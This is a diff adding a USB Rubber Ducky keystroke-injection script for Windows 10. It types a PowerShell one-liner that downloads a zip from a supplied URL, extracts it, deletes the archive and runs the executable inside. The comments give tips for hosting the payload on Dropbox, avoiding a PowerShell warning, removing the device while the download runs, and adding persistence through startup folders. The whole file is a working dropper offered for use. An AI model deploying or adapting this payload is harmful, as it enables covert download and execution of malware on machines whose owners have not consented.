@@ -1,0 +1,26 @@
+REM Name: DROP-ZIP-EXCECUTE
+REM Author: Lumen
+REM Description: Downloads program in a zip file, then unzips and executes it
+REM Target: Windows 10 powershell
+DELAY 1000
+GUI r
+DELAY 300
+STRING powershell
+DELAY 300
+ENTER
+DELAY 600
+STRING Invoke-WebRequest -Uri <ZIP URL> -OutFile "~\Documents\My Games\file.zip"; Expand-Archive -Path "~\Documents\My Games\file.zip" -DestinationPath "~\Documents\My Games\file"; Remove-Item "~\Documents\My Games\file.zip"; & '<EXE PATH>'
+ENTER
+REM Invoke-WebRequest gets and saves the content of the URI given to it
+REM Pasting a dropbox link works well here. Just get the share link and change ?dl=0 to ?dl=1
+REM Expand-Archive Unzips path to destinationPath
+REM Remove-Item deletes the zip file (just to clean up a bit)
+REM & tells powershell to execute the given path
+REM since powershelgl opens at C:\Users\%user%, a relative path can be used from there
+REM using %user% seems to set off a red flag in powershell, but relative paths work well
+REM ; allows multiple commands to be run one after the other, so rather than running one and 
+REM guessing a wait time, the command is entered and ran all at once.
+REM once the command is typed and the download begins, the ducky can be removed and the
+REM computer will take care of the rest through the given instructions
+REM Best when combined with a well made BATCH file to shift files around, make multiple copies,
+REM shortcuts, and move them into startup folders ;)
